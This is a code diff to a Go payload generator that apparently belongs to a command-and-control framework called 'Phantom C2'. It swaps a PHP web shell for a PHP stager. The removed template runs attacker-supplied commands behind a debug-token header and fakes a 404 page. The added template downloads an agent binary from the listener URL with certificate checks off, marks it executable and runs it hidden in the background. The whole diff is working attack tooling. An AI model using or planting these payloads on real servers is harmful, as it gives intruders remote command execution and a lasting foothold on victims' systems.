@@ -124,56 +124,35 @@ if (Request.Headers["X-Debug-Token"] == "{{.Token}}") {
 
 func generatePHP(cfg PayloadConfig) (string, error) {
 	tmpl := `<?php
-// Phantom C2 — PHP Web Shell
-// Works on Apache/Nginx (mod_php/CGI) and php-cli (Flask/custom handlers)
+// Phantom C2 — PHP Stager
+// Downloads and executes the agent — works on any PHP environment
 error_reporting(0);
+$url = '{{.ListenerURL}}/api/v1/update';
+$tmp = tempnam(sys_get_temp_dir(), '.update');
 
-// Get auth token — check $_SERVER first (web server), then env (CLI)
-$token = '';
-if (isset($_SERVER['HTTP_X_DEBUG_TOKEN'])) {
-    $token = $_SERVER['HTTP_X_DEBUG_TOKEN'];
-} elseif (getenv('HTTP_X_DEBUG_TOKEN')) {
-    $token = getenv('HTTP_X_DEBUG_TOKEN');
+// Download agent binary
+$data = @file_get_contents($url);
+if (!$data) {
+    $ch = curl_init($url);
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
+    $data = curl_exec($ch);
+    curl_close($ch);
 }
 
-// Get command — check $_POST first (web server), then parse stdin (CLI)
-$cmd = '';
-if (isset($_POST['data'])) {
-    $cmd = $_POST['data'];
-} elseif (getenv('CONTENT_LENGTH') && getenv('CONTENT_LENGTH') > 0) {
-    $input = file_get_contents('php://stdin');
-    parse_str($input, $params);
-    if (isset($params['data'])) $cmd = $params['data'];
-}
-
-if ($token === '{{.Token}}') {
-    if ($cmd !== '') {
-        $output = '';
-        if (function_exists('exec')) {
-            exec($cmd . ' 2>&1', $out);
-            $output = implode("\n", $out);
-        } elseif (function_exists('shell_exec')) {
-            $output = shell_exec($cmd . ' 2>&1');
-        } elseif (function_exists('system')) {
-            ob_start();
-            system($cmd . ' 2>&1');
-            $output = ob_get_clean();
-        } elseif (function_exists('passthru')) {
-            ob_start();
-            passthru($cmd . ' 2>&1');
-            $output = ob_get_clean();
-        } elseif (function_exists('popen')) {
-            $handle = popen($cmd . ' 2>&1', 'r');
-            $output = fread($handle, 65536);
-            pclose($handle);
-        }
-        echo $output;
+if ($data && strlen($data) > 100) {
+    file_put_contents($tmp, $data);
+    chmod($tmp, 0755);
+    // Execute in background
+    if (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN') {
+        pclose(popen("start /B $tmp", "r"));
     } else {
-        echo "ready";
+        exec("nohup $tmp > /dev/null 2>&1 &");
     }
+    echo "[+] Agent deployed (PID started)\n";
 } else {
-    if (php_sapi_name() !== 'cli') http_response_code(404);
-    echo '<html><head><title>404</title></head><body><h1>Not Found</h1></body></html>';
+    echo "[-] Failed to download agent from $url\n";
 }
 ?>`
 	return renderTemplate(tmpl, cfg)
